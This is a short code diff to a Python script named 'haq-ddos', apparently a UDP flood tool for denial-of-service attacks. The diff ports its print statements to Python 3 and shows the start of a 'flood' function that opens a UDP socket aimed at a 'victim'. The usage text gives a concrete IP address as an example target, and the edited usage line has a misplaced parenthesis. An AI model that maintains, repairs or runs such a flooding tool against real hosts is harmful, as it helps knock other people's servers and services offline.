@@ -7,8 +7,8 @@ import os
 
 os.system("git pull")
 os.system("figlet haq-ddos")
-print "Tool Created By White Tiger"
-print "starting in 9 seconds....."
+print ("Tool Created By White Tiger")
+print ("starting in 3 seconds.....")
 time.sleep(5)
 
 os.system("clear")
@@ -17,8 +17,8 @@ time.sleep(3)
 
 def usage():
 	os.system("figlet haq-ddos")
-	print "Tool Created By White Tiger"
-        print "Usage : python3 haq ddos.py 196.220.60.200 80 100"
+	print ("Tool Created By White Tiger")
+        print ("Usage : python3 haq ddos.py) 196.220.60.200 80 100"
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
